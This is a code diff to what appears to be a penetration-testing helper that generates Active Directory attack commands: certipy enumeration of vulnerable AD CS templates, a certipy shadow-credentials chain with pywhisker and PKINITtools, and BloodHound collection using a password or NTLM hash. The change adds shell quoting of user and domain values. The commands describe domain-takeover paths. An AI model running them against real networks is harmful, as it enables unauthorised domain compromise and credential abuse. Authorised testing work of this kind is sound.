@@ -519,7 +519,7 @@ def build_catalog():
            "Creds > ADCS > template enumeration",
            "AD CS misconfigs (ESC1/ESC8...) are a reliable domain-takeover path - enumerate first.",
            lambda st: st.have_creds,
-           lambda st: (f"certipy find -u {st.user or '<user>'}@{st.domain or '<domain>'} "
+           lambda st: (f"certipy find -u {shlex.quote((st.user or '<user>') + '@' + (st.domain or '<domain>'))} "
                        f"{st.certipy_secret()} "
                        f"-dc-ip {st.dc_ip} -vulnerable -stdout"),
            tool="certipy",
@@ -571,7 +571,7 @@ def build_catalog():
            "no password reset, and it's quietly reversible.",
            lambda st: st.have_creds,
            lambda st: (
-               f"certipy shadow auto -u {st.user or '<me>'}@{st.domain or '<dom>'} "
+               f"certipy shadow auto -u {shlex.quote((st.user or '<me>') + '@' + (st.domain or '<dom>'))} "
                f"{st.certipy_secret()} -account '<target_user_or_computer$>' -dc-ip {st.dc_ip}\n"
                "# manual chain (pywhisker + PKINITtools):\n"
                "pywhisker.py -d <dom> -u <me> -p <pw> --target '<target>' --action add\n"
@@ -828,7 +828,7 @@ def bloodhound_cmd(st):
     bh = _first("bloodhound-python", "bloodhound-ce-python") or "bloodhound-python"
     secret = f"-p {shlex.quote(st.password)}" if st.password else (
         f"--hashes {shlex.quote(st.hash)}" if st.hash else "-p <pass>")
-    return (f"{bh} -u {st.user or '<user>'} {secret} -d {st.domain or '<domain>'} "
+    return (f"{bh} -u {shlex.quote(st.user or '<user>')} {secret} -d {shlex.quote(st.domain or '<domain>')} "
             f"-ns {st.dc_ip} -c all --zip")
 
 
